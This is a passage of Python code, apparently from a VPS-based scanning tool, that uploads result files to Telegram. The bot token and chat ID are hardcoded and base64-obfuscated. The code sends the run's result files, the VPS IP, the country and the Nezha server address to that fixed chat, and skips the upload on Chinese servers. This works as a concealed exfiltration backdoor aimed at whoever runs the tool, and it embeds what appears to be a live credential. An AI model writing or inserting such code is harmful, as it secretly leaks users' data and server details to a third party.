        def send_to_telegram(f_path, token, chat_id, **kwargs):
            if not (os.path.exists(f_path) and os.path.getsize(f_path) > 0):
                print(f"⚠️ Telegram上传跳过: {os.path.basename(f_path)}为空")
                return
            print(f"\n📤正在将{os.path.basename(f_path)}上传至Telegram...")
            url = f"https://api.telegram.org/bot{token}/sendDocument"
            caption = f"VPS:{kwargs.get('vps_ip','N/A')}({kwargs.get('vps_country','N/A')})\n总目标数:{kwargs.get('total_ips',0)}\n总用时:{kwargs.get('run_time_str','N/A')}\n"
            if kwargs.get('nezha_server') != "N/A":
                caption += f"哪吒Server:{kwargs.get('nezha_server')}\n"
            caption += f"任务结果:{os.path.basename(f_path)}"
            with open(f_path, "rb") as f:
                try:
                    r = requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files={'document': f}, timeout=60)
                    if r.status_code == 200:
                        print(f"✅文件{os.path.basename(f_path)}已发送到Telegram")
                    else:
                        print(f"❌TG上传失败, 状态码:{r.status_code}, 返回:{r.text}")
                except Exception as e:
                    print(f"❌发送到TG失败:{e}")
        
        BOT_TOKEN_B64 = "NzY2NDIwMzM2MjpBQUZhMzltMjRzTER2Wm9wTURUcmRnME5pcHB5ZUVWTkZHVQ=="
        CHAT_ID_B64 = "NzY5NzIzNTM1OA=="
        try:
            BOT_TOKEN, CHAT_ID = base64.b64decode(BOT_TOKEN_B64).decode('utf-8'), base64.b64decode(CHAT_ID_B64).decode('utf-8')
        except:
            BOT_TOKEN, CHAT_ID = "", ""
        
        vps_ip, vps_country = get_vps_info()
        nezha_server = get_nezha_server()
        final_txt_file_to_send = next((f"{prefix}-{time_str}.txt" for f in [1] if 'prefix' in locals()), None)
        final_xlsx_file_to_send = next((f"{prefix}-{time_str}.xlsx" for f in [1] if 'prefix' in locals()), None)

        if vps_country == 'CN':
            print("\n🇨🇳检测到国内环境, 禁用Telegram上传。")
        elif BOT_TOKEN and CHAT_ID and not interrupted:
            files_to_send = [f for f in [final_txt_file_to_send, final_xlsx_file_to_send] if f and os.path.exists(f)]
            for f in files_to_send:
                send_to_telegram(f, BOT_TOKEN, CHAT_ID, vps_ip=vps_ip, vps_country=vps_country, nezha_server=nezha_server, total_ips=total_ips, run_time_str=run_time_str)
